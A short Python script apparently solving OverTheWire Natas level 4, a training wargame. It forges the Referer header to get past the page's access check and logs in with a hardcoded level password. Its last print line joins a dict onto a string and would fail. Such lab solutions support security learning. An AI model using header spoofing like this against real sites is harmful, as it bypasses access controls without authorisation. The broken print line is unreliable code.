#!/usr/bin/env python

import requests
NATAS="natas4"
PASS='Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers = { 'referer': 'http://natas5.natas.labs.overthewire.org/'}

r = requests.get("http://" + NATAS + ".natas.labs.overthewire.org/index.php" , auth=(NATAS, 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ') , headers=headers)

print(r.history)
#print(r.status_code)
print(r.text)
print("Encording: " + r.encoding + "HTTP Code: " + "Headers: " + r.headers)
#print(r.headers)

